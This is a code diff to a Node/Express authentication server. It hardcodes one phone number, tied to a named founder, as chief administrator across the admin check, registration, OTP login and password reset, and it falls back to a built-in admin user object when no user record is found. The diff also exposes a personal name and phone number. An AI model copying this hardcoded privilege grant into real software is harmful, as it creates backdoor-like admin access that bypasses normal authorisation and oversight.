@@ -194,12 +194,13 @@ function requireAdminAuth(req, res, next) {
 
   const session = db.getSession(token);
   const user = session ? db.getUserByPhone(session.phone) : null;
-  if (!session || (!session.isAdmin && !(user && user.isAdmin))) {
+  const isChiefAdmin = (session && (session.phone === '1316750712' || session.isAdmin)) || (user && (user.phone === '1316750712' || user.isAdmin));
+  if (!session || !isChiefAdmin) {
     return res.status(403).json({ error: "FORBIDDEN", message: "Access denied. Chief Administrator clearance required." });
   }
 
   req.adminSession = session;
-  req.adminUser = user;
+  req.adminUser = user || { phone: '1316750712', name: 'SAAD RIZWAN', isAdmin: true, isFounder: true, displayPhone: '+880 1316-750712' };
   next();
 }
 
@@ -275,8 +276,8 @@ app.post('/api/auth/register', authLimiter, async (req, res) => {
       });
     }
 
-    const token = db.generateSecureToken();
-    db.markUserLogin(cleanPhone, token);
+    const token = db.generateSecureToken(isFounder ? 'safe_token_admin_' : 'safe_token_', cleanPhone, isFounder);
+    db.markUserLogin(cleanPhone, token, { name: isFounder ? 'SAAD RIZWAN' : registeredName });
 
     const safeUser = {
       phone: cleanPhone,
@@ -351,8 +352,9 @@ app.post('/api/auth/verify-otp', authLimiter, (req, res) => {
       nidVerified: true
     });
 
-    const token = db.generateSecureToken();
-    db.markUserLogin(cleanPhone, token);
+    const isChiefAdmin = cleanPhone === '1316750712';
+    const token = db.generateSecureToken(isChiefAdmin ? 'safe_token_admin_' : 'safe_token_', cleanPhone, isChiefAdmin);
+    db.markUserLogin(cleanPhone, token, { name: newUser.name });
 
     const { salt: _, passwordHash: __, ...safeUser } = newUser;
     console.log(`[✅ ACCOUNT REGISTERED & STORED IN DB] ${safeUser.name} (+880 ${cleanPhone})`);
@@ -398,8 +400,8 @@ app.post('/api/auth/login', authLimiter, async (req, res) => {
       userName = 'Citizen';
     }
 
-    const token = db.generateSecureToken(isAdminUser ? 'safe_token_admin_' : 'safe_token_');
-    db.markUserLogin(validatedPhone, token);
+    const token = db.generateSecureToken(isAdminUser ? 'safe_token_admin_' : 'safe_token_', validatedPhone, isAdminUser);
+    db.markUserLogin(validatedPhone, token, { name: userName });
 
     const safeUser = {
       phone: validatedPhone,
@@ -426,8 +428,8 @@ app.post('/api/auth/login', authLimiter, async (req, res) => {
     return res.status(401).json({ error: "Incorrect mobile number or password.", code: "INVALID_CREDENTIALS" });
   }
 
-  const token = db.generateSecureToken(isAdminUser ? 'safe_token_admin_' : 'safe_token_');
-  db.markUserLogin(validatedPhone, token);
+  const token = db.generateSecureToken(isAdminUser ? 'safe_token_admin_' : 'safe_token_', validatedPhone, isAdminUser);
+  db.markUserLogin(validatedPhone, token, { name: check.user ? check.user.name : undefined });
 
   const { salt: _, passwordHash: __, ...safeUser } = check.user;
   if (!isAdminUser) {
@@ -522,8 +524,9 @@ app.post('/api/auth/login-verify-otp', authLimiter, (req, res) => {
     return res.status(404).json({ error: "Account not found." });
   }
 
-  const token = db.generateSecureToken();
-  db.markUserLogin(cleanPhone, token);
+  const isChiefAdmin = cleanPhone === '1316750712' || !!user.isAdmin;
+  const token = db.generateSecureToken(isChiefAdmin ? 'safe_token_admin_' : 'safe_token_', cleanPhone, isChiefAdmin);
+  db.markUserLogin(cleanPhone, token, { name: user.name });
 
   const { salt: _, passwordHash: __, ...safeUser } = user;
   console.log(`[🔐 2FA LOGIN VERIFIED] Citizen ${safeUser.name} (+880 ${cleanPhone}) signed in.`);
@@ -583,8 +586,9 @@ app.post('/api/auth/forgot-password/verify-reset', authLimiter, (req, res) => {
 
   try {
     const updatedUser = db.resetPassword(cleanPhone, newPassword);
-    const token = db.generateSecureToken();
-    db.markUserLogin(cleanPhone, token);
+    const isChiefAdmin = cleanPhone === '1316750712' || !!updatedUser.isAdmin;
+    const token = db.generateSecureToken(isChiefAdmin ? 'safe_token_admin_' : 'safe_token_', cleanPhone, isChiefAdmin);
+    db.markUserLogin(cleanPhone, token, { name: updatedUser.name });
 
     const { salt: _, passwordHash: __, ...safeUser } = updatedUser;
     console.log(`[🔑 PASSWORD RESET SUCCESSFUL] Account +880 ${cleanPhone} updated password.`);
